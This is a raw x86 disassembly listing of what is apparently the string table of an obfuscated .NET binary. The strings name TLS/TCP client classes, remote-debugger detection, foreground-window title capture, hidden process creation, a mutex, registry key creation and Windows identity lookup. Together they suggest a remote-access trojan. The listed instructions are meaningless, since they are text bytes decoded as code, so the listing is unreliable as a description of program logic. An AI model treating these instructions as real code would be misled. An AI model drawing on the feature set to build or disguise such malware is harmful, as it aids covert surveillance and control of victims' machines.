  4099b2:	6f                   	outsl  %ds:(%esi),(%dx)
  4099b3:	6c                   	insb   (%dx),%es:(%edi)
  4099b4:	6c                   	insb   (%dx),%es:(%edi)
  4099b5:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4099ba:	6e                   	outsb  %ds:(%esi),(%dx)
  4099bb:	73 2e                	jae    0x4099eb
  4099bd:	49                   	dec    %ecx
  4099be:	45                   	inc    %ebp
  4099bf:	6e                   	outsb  %ds:(%esi),(%dx)
  4099c0:	75 6d                	jne    0x409a2f
  4099c2:	65 72 61             	gs jb  0x409a26
  4099c5:	74 6f                	je     0x409a36
  4099c7:	72 2e                	jb     0x4099f7
  4099c9:	52                   	push   %edx
  4099ca:	65 73 65             	gs jae 0x409a32
  4099cd:	74 00                	je     0x4099cf
  4099cf:	67 65 74 5f          	addr16 gs je 0x409a32
  4099d3:	4f                   	dec    %edi
  4099d4:	66 66 73 65          	data16 data16 jae 0x409a3d
  4099d8:	74 00                	je     0x4099da
  4099da:	73 65                	jae    0x409a41
  4099dc:	74 5f                	je     0x409a3d
  4099de:	4f                   	dec    %edi
  4099df:	66 66 73 65          	data16 data16 jae 0x409a48
  4099e3:	74 00                	je     0x4099e5
  4099e5:	53                   	push   %ebx
  4099e6:	70 6c                	jo     0x409a54
  4099e8:	69 74 00 45 78 69 74 	imul   $0x746978,0x45(%eax,%eax,1),%esi
  4099ef:	00 
  4099f0:	49                   	dec    %ecx
  4099f1:	41                   	inc    %ecx
  4099f2:	73 79                	jae    0x409a6d
  4099f4:	6e                   	outsb  %ds:(%esi),(%dx)
  4099f5:	63 52 65             	arpl   %edx,0x65(%edx)
  4099f8:	73 75                	jae    0x409a6f
  4099fa:	6c                   	insb   (%dx),%es:(%edi)
  4099fb:	74 00                	je     0x4099fd
  4099fd:	54                   	push   %esp
  4099fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4099ff:	55                   	push   %ebp
  409a00:	70 70                	jo     0x409a72
  409a02:	65 72 49             	gs jb  0x409a4e
  409a05:	6e                   	outsb  %ds:(%esi),(%dx)
  409a06:	76 61                	jbe    0x409a69
  409a08:	72 69                	jb     0x409a73
  409a0a:	61                   	popa
  409a0b:	6e                   	outsb  %ds:(%esi),(%dx)
  409a0c:	74 00                	je     0x409a0e
  409a0e:	57                   	push   %edi
  409a0f:	65 62 43 6c          	bound  %eax,%gs:0x6c(%ebx)
  409a13:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  409a1a:	74 5f                	je     0x409a7b
  409a1c:	53                   	push   %ebx
  409a1d:	73 6c                	jae    0x409a8b
  409a1f:	43                   	inc    %ebx
  409a20:	6c                   	insb   (%dx),%es:(%edi)
  409a21:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  409a28:	74 5f                	je     0x409a89
  409a2a:	53                   	push   %ebx
  409a2b:	73 6c                	jae    0x409a99
  409a2d:	43                   	inc    %ebx
  409a2e:	6c                   	insb   (%dx),%es:(%edi)
  409a2f:	69 65 6e 74 00 67 65 	imul   $0x65670074,0x6e(%ebp),%esp
  409a36:	74 5f                	je     0x409a97
  409a38:	54                   	push   %esp
  409a39:	63 70 43             	arpl   %esi,0x43(%eax)
  409a3c:	6c                   	insb   (%dx),%es:(%edi)
  409a3d:	69 65 6e 74 00 73 65 	imul   $0x65730074,0x6e(%ebp),%esp
  409a44:	74 5f                	je     0x409aa5
  409a46:	54                   	push   %esp
  409a47:	63 70 43             	arpl   %esi,0x43(%eax)
  409a4a:	6c                   	insb   (%dx),%es:(%edi)
  409a4b:	69 65 6e 74 00 41 75 	imul   $0x75410074,0x6e(%ebp),%esp
  409a52:	74 68                	je     0x409abc
  409a54:	65 6e                	outsb  %gs:(%esi),(%dx)
  409a56:	74 69                	je     0x409ac1
  409a58:	63 61 74             	arpl   %esp,0x74(%ecx)
  409a5b:	65 41                	gs inc %ecx
  409a5d:	73 43                	jae    0x409aa2
  409a5f:	6c                   	insb   (%dx),%es:(%edi)
  409a60:	69 65 6e 74 00 53 79 	imul   $0x79530074,0x6e(%ebp),%esp
  409a67:	73 74                	jae    0x409add
  409a69:	65 6d                	gs insl (%dx),%es:(%edi)
  409a6b:	2e 4d                	cs dec %ebp
  409a6d:	61                   	popa
  409a6e:	6e                   	outsb  %ds:(%esi),(%dx)
  409a6f:	61                   	popa
  409a70:	67 65 6d             	gs insl (%dx),%es:(%di)
  409a73:	65 6e                	outsb  %gs:(%esi),(%dx)
  409a75:	74 00                	je     0x409a77
  409a77:	45                   	inc    %ebp
  409a78:	6e                   	outsb  %ds:(%esi),(%dx)
  409a79:	76 69                	jbe    0x409ae4
  409a7b:	72 6f                	jb     0x409aec
  409a7d:	6e                   	outsb  %ds:(%esi),(%dx)
  409a7e:	6d                   	insl   (%dx),%es:(%edi)
  409a7f:	65 6e                	outsb  %gs:(%esi),(%dx)
  409a81:	74 00                	je     0x409a83
  409a83:	53                   	push   %ebx
  409a84:	79 73                	jns    0x409af9
  409a86:	74 65                	je     0x409aed
  409a88:	6d                   	insl   (%dx),%es:(%edi)
  409a89:	2e 43                	cs inc %ebx
  409a8b:	6f                   	outsl  %ds:(%esi),(%dx)
  409a8c:	6c                   	insb   (%dx),%es:(%edi)
  409a8d:	6c                   	insb   (%dx),%es:(%edi)
  409a8e:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409a93:	6e                   	outsb  %ds:(%esi),(%dx)
  409a94:	73 2e                	jae    0x409ac4
  409a96:	49                   	dec    %ecx
  409a97:	45                   	inc    %ebp
  409a98:	6e                   	outsb  %ds:(%esi),(%dx)
  409a99:	75 6d                	jne    0x409b08
  409a9b:	65 72 61             	gs jb  0x409aff
  409a9e:	74 6f                	je     0x409b0f
  409aa0:	72 2e                	jb     0x409ad0
  409aa2:	67 65 74 5f          	addr16 gs je 0x409b05
  409aa6:	43                   	inc    %ebx
  409aa7:	75 72                	jne    0x409b1b
  409aa9:	72 65                	jb     0x409b10
  409aab:	6e                   	outsb  %ds:(%esi),(%dx)
  409aac:	74 00                	je     0x409aae
  409aae:	47                   	inc    %edi
  409aaf:	65 74 43             	gs je  0x409af5
  409ab2:	75 72                	jne    0x409b26
  409ab4:	72 65                	jb     0x409b1b
  409ab6:	6e                   	outsb  %ds:(%esi),(%dx)
  409ab7:	74 00                	je     0x409ab9
  409ab9:	43                   	inc    %ebx
  409aba:	68 65 63 6b 52       	push   $0x526b6365
  409abf:	65 6d                	gs insl (%dx),%es:(%edi)
  409ac1:	6f                   	outsl  %ds:(%esi),(%dx)
  409ac2:	74 65                	je     0x409b29
  409ac4:	44                   	inc    %esp
  409ac5:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  409ac9:	67 65 72 50          	addr16 gs jb 0x409b1d
  409acd:	72 65                	jb     0x409b34
  409acf:	73 65                	jae    0x409b36
  409ad1:	6e                   	outsb  %ds:(%esi),(%dx)
  409ad2:	74 00                	je     0x409ad4
  409ad4:	67 65 74 5f          	addr16 gs je 0x409b37
  409ad8:	52                   	push   %edx
  409ad9:	65 6d                	gs insl (%dx),%es:(%edi)
  409adb:	6f                   	outsl  %ds:(%esi),(%dx)
  409adc:	74 65                	je     0x409b43
  409ade:	45                   	inc    %ebp
  409adf:	6e                   	outsb  %ds:(%esi),(%dx)
  409ae0:	64 50                	fs push %eax
  409ae2:	6f                   	outsl  %ds:(%esi),(%dx)
  409ae3:	69 6e 74 00 67 65 74 	imul   $0x74656700,0x74(%esi),%ebp
  409aea:	5f                   	pop    %edi
  409aeb:	43                   	inc    %ebx
  409aec:	6f                   	outsl  %ds:(%esi),(%dx)
  409aed:	75 6e                	jne    0x409b5d
  409aef:	74 00                	je     0x409af1
  409af1:	67 65 74 5f          	addr16 gs je 0x409b54
  409af5:	50                   	push   %eax
  409af6:	72 6f                	jb     0x409b67
  409af8:	63 65 73             	arpl   %esp,0x73(%ebp)
  409afb:	73 6f                	jae    0x409b6c
  409afd:	72 43                	jb     0x409b42
  409aff:	6f                   	outsl  %ds:(%esi),(%dx)
  409b00:	75 6e                	jne    0x409b70
  409b02:	74 00                	je     0x409b04
  409b04:	47                   	inc    %edi
  409b05:	65 74 50             	gs je  0x409b58
  409b08:	61                   	popa
  409b09:	74 68                	je     0x409b73
  409b0b:	52                   	push   %edx
  409b0c:	6f                   	outsl  %ds:(%esi),(%dx)
  409b0d:	6f                   	outsl  %ds:(%esi),(%dx)
  409b0e:	74 00                	je     0x409b10
  409b10:	50                   	push   %eax
  409b11:	61                   	popa
  409b12:	72 61                	jb     0x409b75
  409b14:	6d                   	insl   (%dx),%es:(%edi)
  409b15:	65 74 65             	gs je  0x409b7d
  409b18:	72 69                	jb     0x409b83
  409b1a:	7a 65                	jp     0x409b81
  409b1c:	64 54                	fs push %esp
  409b1e:	68 72 65 61 64       	push   $0x64616572
  409b23:	53                   	push   %ebx
  409b24:	74 61                	je     0x409b87
  409b26:	72 74                	jb     0x409b9c
  409b28:	00 43 6f             	add    %al,0x6f(%ebx)
  409b2b:	6e                   	outsb  %ds:(%esi),(%dx)
  409b2c:	76 65                	jbe    0x409b93
  409b2e:	72 74                	jb     0x409ba4
  409b30:	00 46 61             	add    %al,0x61(%esi)
  409b33:	69 6c 46 61 73 74 00 	imul   $0x54007473,0x61(%esi,%eax,2),%ebp
  409b3a:	54 
  409b3b:	6f                   	outsl  %ds:(%esi),(%dx)
  409b3c:	4c                   	dec    %esp
  409b3d:	69 73 74 00 53 79 73 	imul   $0x73795300,0x74(%ebx),%esi
  409b44:	74 65                	je     0x409bab
  409b46:	6d                   	insl   (%dx),%es:(%edi)
  409b47:	2e 43                	cs inc %ebx
  409b49:	6f                   	outsl  %ds:(%esi),(%dx)
  409b4a:	6c                   	insb   (%dx),%es:(%edi)
  409b4b:	6c                   	insb   (%dx),%es:(%edi)
  409b4c:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  409b51:	6e                   	outsb  %ds:(%esi),(%dx)
  409b52:	73 2e                	jae    0x409b82
  409b54:	49                   	dec    %ecx
  409b55:	45                   	inc    %ebp
  409b56:	6e                   	outsb  %ds:(%esi),(%dx)
  409b57:	75 6d                	jne    0x409bc6
  409b59:	65 72 61             	gs jb  0x409bbd
  409b5c:	74 6f                	je     0x409bcd
  409b5e:	72 2e                	jb     0x409b8e
  409b60:	4d                   	dec    %ebp
  409b61:	6f                   	outsl  %ds:(%esi),(%dx)
  409b62:	76 65                	jbe    0x409bc9
  409b64:	4e                   	dec    %esi
  409b65:	65 78 74             	gs js  0x409bdc
  409b68:	00 53 79             	add    %dl,0x79(%ebx)
  409b6b:	73 74                	jae    0x409be1
  409b6d:	65 6d                	gs insl (%dx),%es:(%edi)
  409b6f:	2e 54                	cs push %esp
  409b71:	65 78 74             	gs js  0x409be8
  409b74:	00 47 65             	add    %al,0x65(%edi)
  409b77:	74 57                	je     0x409bd0
  409b79:	69 6e 64 6f 77 54 65 	imul   $0x6554776f,0x64(%esi),%ebp
  409b80:	78 74                	js     0x409bf6
  409b82:	00 6e 70             	add    %ch,0x70(%esi)
  409b85:	63 52 65             	arpl   %edx,0x65(%edx)
  409b88:	42                   	inc    %edx
  409b89:	67 68 71 58 41 4d    	addr16 push $0x4d415871
  409b8f:	4f                   	dec    %edi
  409b90:	43                   	inc    %ebx
  409b91:	75 00                	jne    0x409b93
  409b93:	70 6f                	jo     0x409c04
  409b95:	6f                   	outsl  %ds:(%esi),(%dx)
  409b96:	70 62                	jo     0x409bfa
  409b98:	54                   	push   %esp
  409b99:	6e                   	outsb  %ds:(%esi),(%dx)
  409b9a:	56                   	push   %esi
  409b9b:	44                   	inc    %esp
  409b9c:	75 00                	jne    0x409b9e
  409b9e:	4f                   	dec    %edi
  409b9f:	53                   	push   %ebx
  409ba0:	6e                   	outsb  %ds:(%esi),(%dx)
  409ba1:	41                   	inc    %ecx
  409ba2:	54                   	push   %esp
  409ba3:	56                   	push   %esi
  409ba4:	75 4a                	jne    0x409bf0
  409ba6:	47                   	inc    %edi
  409ba7:	75 00                	jne    0x409ba9
  409ba9:	74 45                	je     0x409bf0
  409bab:	63 6e 45             	arpl   %ebp,0x45(%esi)
  409bae:	41                   	inc    %ecx
  409baf:	76 5a                	jbe    0x409c0b
  409bb1:	52                   	push   %edx
  409bb2:	79 45                	jns    0x409bf9
  409bb4:	56                   	push   %esi
  409bb5:	6a 75                	push   $0x75
  409bb7:	00 72 46             	add    %dh,0x46(%edx)
  409bba:	45                   	inc    %ebp
  409bbb:	76 77                	jbe    0x409c34
  409bbd:	76 4f                	jbe    0x409c0e
  409bbf:	68 72 75 4c 72       	push   $0x724c7572
  409bc4:	75 00                	jne    0x409bc6
  409bc6:	74 7a                	je     0x409c42
  409bc8:	51                   	push   %ecx
  409bc9:	61                   	popa
  409bca:	77 41                	ja     0x409c0d
  409bcc:	62 75 49             	bound  %esi,0x49(%ebp)
  409bcf:	49                   	dec    %ecx
  409bd0:	44                   	inc    %esp
  409bd1:	7a 75                	jp     0x409c48
  409bd3:	00 65 4b             	add    %ah,0x4b(%ebp)
  409bd6:	6c                   	insb   (%dx),%es:(%edi)
  409bd7:	45                   	inc    %ebp
  409bd8:	4c                   	dec    %esp
  409bd9:	47                   	inc    %edi
  409bda:	44                   	inc    %esp
  409bdb:	63 54 47 67          	arpl   %edx,0x67(%edi,%eax,2)
  409bdf:	7a 75                	jp     0x409c56
  409be1:	00 45 43             	add    %al,0x43(%ebp)
  409be4:	59                   	pop    %ecx
  409be5:	4b                   	dec    %ebx
  409be6:	57                   	push   %edi
  409be7:	47                   	inc    %edi
  409be8:	6f                   	outsl  %ds:(%esi),(%dx)
  409be9:	77 73                	ja     0x409c5e
  409beb:	41                   	inc    %ecx
  409bec:	76 00                	jbe    0x409bee
  409bee:	47                   	inc    %edi
  409bef:	4b                   	dec    %ebx
  409bf0:	77 48                	ja     0x409c3a
  409bf2:	6a 51                	push   $0x51
  409bf4:	76 62                	jbe    0x409c58
  409bf6:	6d                   	insl   (%dx),%es:(%edi)
  409bf7:	62 48 46             	bound  %ecx,0x46(%eax)
  409bfa:	76 00                	jbe    0x409bfc
  409bfc:	4f                   	dec    %edi
  409bfd:	68 43 53 4d 4c       	push   $0x4c4d5343
  409c02:	5a                   	pop    %edx
  409c03:	64 6a 6b             	fs push $0x6b
  409c06:	51                   	push   %ecx
  409c07:	52                   	push   %edx
  409c08:	4e                   	dec    %esi
  409c09:	76 00                	jbe    0x409c0b
  409c0b:	4b                   	dec    %ebx
  409c0c:	45                   	inc    %ebp
  409c0d:	64 6b 75 4c 75       	imul   $0x75,%fs:0x4c(%ebp),%esi
  409c12:	76 75                	jbe    0x409c89
  409c14:	79 58                	jns    0x409c6e
  409c16:	64 53                	fs push %ebx
  409c18:	76 00                	jbe    0x409c1a
  409c1a:	59                   	pop    %ecx
  409c1b:	76 45                	jbe    0x409c62
  409c1d:	6a 57                	push   $0x57
  409c1f:	47                   	inc    %edi
  409c20:	51                   	push   %ecx
  409c21:	50                   	push   %eax
  409c22:	4e                   	dec    %esi
  409c23:	59                   	pop    %ecx
  409c24:	61                   	popa
  409c25:	6b 76 00 44          	imul   $0x44,0x0(%esi),%esi
  409c29:	58                   	pop    %eax
  409c2a:	57                   	push   %edi
  409c2b:	47                   	inc    %edi
  409c2c:	49                   	dec    %ecx
  409c2d:	68 75 45 43 70       	push   $0x70434575
  409c32:	68 4f 6c 76 00       	push   $0x766c4f
  409c37:	4a                   	dec    %edx
  409c38:	65 68 53 56 64 73    	gs push $0x73645653
  409c3e:	4e                   	dec    %esi
  409c3f:	76 4c                	jbe    0x409c8d
  409c41:	71 76                	jno    0x409cb9
  409c43:	00 78 4d             	add    %bh,0x4d(%eax)
  409c46:	78 6e                	js     0x409cb6
  409c48:	45                   	inc    %ebp
  409c49:	7a 48                	jp     0x409c93
  409c4b:	54                   	push   %esp
  409c4c:	71 6a                	jno    0x409cb8
  409c4e:	74 76                	je     0x409cc6
  409c50:	00 55 50             	add    %dl,0x50(%ebp)
  409c53:	69 42 76 72 4a 41 4f 	imul   $0x4f414a72,0x76(%edx),%eax
  409c5a:	45                   	inc    %ebp
  409c5b:	77 00                	ja     0x409c5d
  409c5d:	49                   	dec    %ecx
  409c5e:	46                   	inc    %esi
  409c5f:	66 49                	dec    %cx
  409c61:	45                   	inc    %ebp
  409c62:	73 53                	jae    0x409cb7
  409c64:	6f                   	outsl  %ds:(%esi),(%dx)
  409c65:	69 69 43 4a 77 00 57 	imul   $0x5700774a,0x43(%ecx),%ebp
  409c6c:	64 58                	fs pop %eax
  409c6e:	4e                   	dec    %esi
  409c6f:	72 52                	jb     0x409cc3
  409c71:	69 48 41 41 61 77 00 	imul   $0x776141,0x41(%eax),%ecx
  409c78:	45                   	inc    %ebp
  409c79:	6f                   	outsl  %ds:(%esi),(%dx)
  409c7a:	55                   	push   %ebp
  409c7b:	50                   	push   %eax
  409c7c:	74 54                	je     0x409cd2
  409c7e:	56                   	push   %esi
  409c7f:	44                   	inc    %esp
  409c80:	53                   	push   %ebx
  409c81:	55                   	push   %ebp
  409c82:	6b 46 68 77          	imul   $0x77,0x68(%esi),%eax
  409c86:	00 47 65             	add    %al,0x65(%edi)
  409c89:	74 46                	je     0x409cd1
  409c8b:	6f                   	outsl  %ds:(%esi),(%dx)
  409c8c:	72 65                	jb     0x409cf3
  409c8e:	67 72 6f             	addr16 jb 0x409d00
  409c91:	75 6e                	jne    0x409d01
  409c93:	64 57                	fs push %edi
  409c95:	69 6e 64 6f 77 00 73 	imul   $0x7300776f,0x64(%esi),%ebp
  409c9c:	65 74 5f             	gs je  0x409cfe
  409c9f:	43                   	inc    %ebx
  409ca0:	72 65                	jb     0x409d07
  409ca2:	61                   	popa
  409ca3:	74 65                	je     0x409d0a
  409ca5:	4e                   	dec    %esi
  409ca6:	6f                   	outsl  %ds:(%esi),(%dx)
  409ca7:	57                   	push   %edi
  409ca8:	69 6e 64 6f 77 00 49 	imul   $0x4900776f,0x64(%esi),%ebp
  409caf:	73 6f                	jae    0x409d20
  409cb1:	61                   	popa
  409cb2:	47                   	inc    %edi
  409cb3:	55                   	push   %ebp
  409cb4:	72 41                	jb     0x409cf7
  409cb6:	45                   	inc    %ebp
  409cb7:	65 5a                	gs pop %edx
  409cb9:	44                   	inc    %esp
  409cba:	72 71                	jb     0x409d2d
  409cbc:	77 00                	ja     0x409cbe
  409cbe:	79 4c                	jns    0x409d0c
  409cc0:	76 4a                	jbe    0x409d0c
  409cc2:	52                   	push   %edx
  409cc3:	48                   	dec    %eax
  409cc4:	63 59 6b             	arpl   %ebx,0x6b(%ecx)
  409cc7:	63 6e 45             	arpl   %ebp,0x45(%esi)
  409cca:	78 00                	js     0x409ccc
  409ccc:	43                   	inc    %ebx
  409ccd:	67 77 71             	addr16 ja 0x409d41
  409cd0:	4a                   	dec    %edx
  409cd1:	4c                   	dec    %esp
  409cd2:	70 4c                	jo     0x409d20
  409cd4:	58                   	pop    %eax
  409cd5:	71 55                	jno    0x409d2c
  409cd7:	51                   	push   %ecx
  409cd8:	52                   	push   %edx
  409cd9:	44                   	inc    %esp
  409cda:	50                   	push   %eax
  409cdb:	78 00                	js     0x409cdd
  409cdd:	4d                   	dec    %ebp
  409cde:	75 74                	jne    0x409d54
  409ce0:	65 78 00             	gs js  0x409ce3
  409ce3:	74 76                	je     0x409d5b
  409ce5:	4e                   	dec    %esi
  409ce6:	79 64                	jns    0x409d4c
  409ce8:	44                   	inc    %esp
  409ce9:	75 78                	jne    0x409d63
  409ceb:	4a                   	dec    %edx
  409cec:	4d                   	dec    %ebp
  409ced:	42                   	inc    %edx
  409cee:	66 55                	push   %bp
  409cf0:	78 61                	js     0x409d53
  409cf2:	72 78                	jb     0x409d6c
  409cf4:	00 65 54             	add    %ah,0x54(%ebp)
  409cf7:	54                   	push   %esp
  409cf8:	42                   	inc    %edx
  409cf9:	4a                   	dec    %edx
  409cfa:	79 6d                	jns    0x409d69
  409cfc:	6e                   	outsb  %ds:(%esi),(%dx)
  409cfd:	6e                   	outsb  %ds:(%esi),(%dx)
  409cfe:	53                   	push   %ebx
  409cff:	72 6e                	jb     0x409d6f
  409d01:	7a 74                	jp     0x409d77
  409d03:	78 00                	js     0x409d05
  409d05:	70 67                	jo     0x409d6e
  409d07:	6e                   	outsb  %ds:(%esi),(%dx)
  409d08:	6a 56                	push   $0x56
  409d0a:	4a                   	dec    %edx
  409d0b:	4b                   	dec    %ebx
  409d0c:	69 6c 64 75 78 00 78 	imul   $0x58780078,0x75(%esp,%eiz,2),%ebp
  409d13:	58 
  409d14:	4d                   	dec    %ebp
  409d15:	44                   	inc    %esp
  409d16:	61                   	popa
  409d17:	63 69 55             	arpl   %ebp,0x55(%ecx)
  409d1a:	66 46                	inc    %si
  409d1c:	77 78                	ja     0x409d96
  409d1e:	00 54 70 45          	add    %dl,0x45(%eax,%esi,2)
  409d22:	66 72 6f             	data16 jb 0x409d94
  409d25:	4b                   	dec    %ebx
  409d26:	62 52 5a             	bound  %edx,0x5a(%edx)
  409d29:	73 77                	jae    0x409da2
  409d2b:	6c                   	insb   (%dx),%es:(%edi)
  409d2c:	45                   	inc    %ebp
  409d2d:	79 00                	jns    0x409d2f
  409d2f:	49                   	dec    %ecx
  409d30:	6e                   	outsb  %ds:(%esi),(%dx)
  409d31:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  409d38:	65 
  409d39:	41                   	inc    %ecx
  409d3a:	72 72                	jb     0x409dae
  409d3c:	61                   	popa
  409d3d:	79 00                	jns    0x409d3f
  409d3f:	54                   	push   %esp
  409d40:	6f                   	outsl  %ds:(%esi),(%dx)
  409d41:	41                   	inc    %ecx
  409d42:	72 72                	jb     0x409db6
  409d44:	61                   	popa
  409d45:	79 00                	jns    0x409d47
  409d47:	67 65 74 5f          	addr16 gs je 0x409daa
  409d4b:	41                   	inc    %ecx
  409d4c:	73 41                	jae    0x409d8f
  409d4e:	72 72                	jb     0x409dc2
  409d50:	61                   	popa
  409d51:	79 00                	jns    0x409d53
  409d53:	6d                   	insl   (%dx),%es:(%edi)
  409d54:	63 4d 43             	arpl   %ecx,0x43(%ebp)
  409d57:	6a 76                	push   $0x76
  409d59:	42                   	inc    %edx
  409d5a:	4d                   	dec    %ebp
  409d5b:	5a                   	pop    %edx
  409d5c:	4e                   	dec    %esi
  409d5d:	64 79 00             	fs jns 0x409d60
  409d60:	67 65 74 5f          	addr16 gs je 0x409dc3
  409d64:	4b                   	dec    %ebx
  409d65:	65 79 00             	gs jns 0x409d68
  409d68:	73 65                	jae    0x409dcf
  409d6a:	74 5f                	je     0x409dcb
  409d6c:	4b                   	dec    %ebx
  409d6d:	65 79 00             	gs jns 0x409d70
  409d70:	43                   	inc    %ebx
  409d71:	72 65                	jb     0x409dd8
  409d73:	61                   	popa
  409d74:	74 65                	je     0x409ddb
  409d76:	53                   	push   %ebx
  409d77:	75 62                	jne    0x409ddb
  409d79:	4b                   	dec    %ebx
  409d7a:	65 79 00             	gs jns 0x409d7d
  409d7d:	4f                   	dec    %edi
  409d7e:	70 65                	jo     0x409de5
  409d80:	6e                   	outsb  %ds:(%esi),(%dx)
  409d81:	53                   	push   %ebx
  409d82:	75 62                	jne    0x409de6
  409d84:	4b                   	dec    %ebx
  409d85:	65 79 00             	gs jns 0x409d88
  409d88:	67 65 74 5f          	addr16 gs je 0x409deb
  409d8c:	50                   	push   %eax
  409d8d:	75 62                	jne    0x409df1
  409d8f:	6c                   	insb   (%dx),%es:(%edi)
  409d90:	69 63 4b 65 79 00 52 	imul   $0x52007965,0x4b(%ebx),%esp
  409d97:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  409d9e:	4b 65 
  409da0:	79 00                	jns    0x409da2
  409da2:	53                   	push   %ebx
  409da3:	79 73                	jns    0x409e18
  409da5:	74 65                	je     0x409e0c
  409da7:	6d                   	insl   (%dx),%es:(%edi)
  409da8:	2e 53                	cs push %ebx
  409daa:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  409dae:	69 74 79 2e 43 72 79 	imul   $0x70797243,0x2e(%ecx,%edi,2),%esi
  409db5:	70 
  409db6:	74 6f                	je     0x409e27
  409db8:	67 72 61             	addr16 jb 0x409e1c
  409dbb:	70 68                	jo     0x409e25
  409dbd:	79 00                	jns    0x409dbf
  409dbf:	41                   	inc    %ecx
  409dc0:	73 73                	jae    0x409e35
  409dc2:	65 6d                	gs insl (%dx),%es:(%edi)
  409dc4:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  409dc8:	41                   	inc    %ecx
  409dc9:	64 64 72 65          	fs fs jb 0x409e32
  409dcd:	73 73                	jae    0x409e42
  409dcf:	46                   	inc    %esi
  409dd0:	61                   	popa
  409dd1:	6d                   	insl   (%dx),%es:(%edi)
  409dd2:	69 6c 79 00 55 6a 57 	imul   $0x7a576a55,0x0(%ecx,%edi,2),%ebp
  409dd9:	7a 
  409dda:	46                   	inc    %esi
  409ddb:	4d                   	dec    %ebp
  409ddc:	78 76                	js     0x409e54
  409dde:	46                   	inc    %esi
  409ddf:	68 50 67 4e 51       	push   $0x514e6750
  409de4:	70 79                	jo     0x409e5f
  409de6:	00 42 6c             	add    %al,0x6c(%edx)
  409de9:	6f                   	outsl  %ds:(%esi),(%dx)
  409dea:	63 6b 43             	arpl   %ebp,0x43(%ebx)
  409ded:	6f                   	outsl  %ds:(%esi),(%dx)
  409dee:	70 79                	jo     0x409e69
  409df0:	00 44 6e 6e          	add    %al,0x6e(%esi,%ebp,2)
  409df4:	7a 72                	jp     0x409e68
  409df6:	6e                   	outsb  %ds:(%esi),(%dx)
  409df7:	47                   	inc    %edi
  409df8:	57                   	push   %edi
  409df9:	4f                   	dec    %edi
  409dfa:	71 79                	jno    0x409e75
  409dfc:	00 4d 6c             	add    %cl,0x6c(%ebp)
  409dff:	62 67 41             	bound  %esp,0x41(%edi)
  409e02:	56                   	push   %esi
  409e03:	41                   	inc    %ecx
  409e04:	74 68                	je     0x409e6e
  409e06:	7a 69                	jp     0x409e71
  409e08:	71 79                	jno    0x409e83
  409e0a:	00 54 6f 42          	add    %dl,0x42(%edi,%ebp,2)
  409e0e:	69 6e 61 72 79 00 67 	imul   $0x67007972,0x61(%esi),%ebp
  409e15:	65 74 5f             	gs je  0x409e77
  409e18:	53                   	push   %ebx
  409e19:	79 73                	jns    0x409e8e
  409e1b:	74 65                	je     0x409e82
  409e1d:	6d                   	insl   (%dx),%es:(%edi)
  409e1e:	44                   	inc    %esp
  409e1f:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  409e26:	79 00                	jns    0x409e28
  409e28:	52                   	push   %edx
  409e29:	65 67 69 73 74 72 79 	imul   $0x4f007972,%gs:0x74(%bp,%di),%esi
  409e30:	00 4f 
  409e32:	77 67                	ja     0x409e9b
  409e34:	66 77 50             	data16 ja 0x409e87
  409e37:	53                   	push   %ebx
  409e38:	77 55                	ja     0x409e8f
  409e3a:	74 79                	je     0x409eb5
  409e3c:	00 6f 70             	add    %ch,0x70(%edi)
  409e3f:	5f                   	pop    %edi
  409e40:	45                   	inc    %ebp
  409e41:	71 75                	jno    0x409eb8
  409e43:	61                   	popa
  409e44:	6c                   	insb   (%dx),%es:(%edi)
  409e45:	69 74 79 00 6f 70 5f 	imul   $0x495f706f,0x0(%ecx,%edi,2),%esi
  409e4c:	49 
  409e4d:	6e                   	outsb  %ds:(%esi),(%dx)
  409e4e:	65 71 75             	gs jno 0x409ec6
  409e51:	61                   	popa
  409e52:	6c                   	insb   (%dx),%es:(%edi)
  409e53:	69 74 79 00 53 79 73 	imul   $0x74737953,0x0(%ecx,%edi,2),%esi
  409e5a:	74 
  409e5b:	65 6d                	gs insl (%dx),%es:(%edi)
  409e5d:	2e 4e                	cs dec %esi
  409e5f:	65 74 2e             	gs je  0x409e90
  409e62:	53                   	push   %ebx
  409e63:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  409e67:	69 74 79 00 57 69 6e 	imul   $0x646e6957,0x0(%ecx,%edi,2),%esi
  409e6e:	64 
  409e6f:	6f                   	outsl  %ds:(%esi),(%dx)
  409e70:	77 73                	ja     0x409ee5
  409e72:	49                   	dec    %ecx
  409e73:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  409e76:	74 69                	je     0x409ee1
  409e78:	74 79                	je     0x409ef3
  409e7a:	00 49 73             	add    %cl,0x73(%ecx)
  409e7d:	4e                   	dec    %esi
  409e7e:	75 6c                	jne    0x409eec
  409e80:	6c                   	insb   (%dx),%es:(%edi)
  409e81:	4f                   	dec    %edi
  409e82:	72 45                	jb     0x409ec9
  409e84:	6d                   	insl   (%dx),%es:(%edi)
  409e85:	70 74                	jo     0x409efb
  409e87:	79 00                	jns    0x409e89
  409e89:	54                   	push   %esp
  409e8a:	4e                   	dec    %esi
  409e8b:	61                   	popa
  409e8c:	66 4b                	dec    %bx
  409e8e:	61                   	popa
  409e8f:	41                   	inc    %ecx
  409e90:	50                   	push   %eax
  409e91:	58                   	pop    %eax
  409e92:	4b                   	dec    %ebx
  409e93:	68 74 6c 55 73       	push   $0x73556c74
  409e98:	79 79                	jns    0x409f13
  409e9a:	00 6f 74             	add    %ch,0x74(%edi)
  409e9d:	54                   	push   %esp
  409e9e:	43                   	inc    %ebx
  409e9f:	5a                   	pop    %edx
  409ea0:	79 42                	jns    0x409ee4
  409ea2:	78 64                	js     0x409f08
  409ea4:	59                   	pop    %ecx
  409ea5:	43                   	inc    %ebx
  409ea6:	7a 00                	jp     0x409ea8
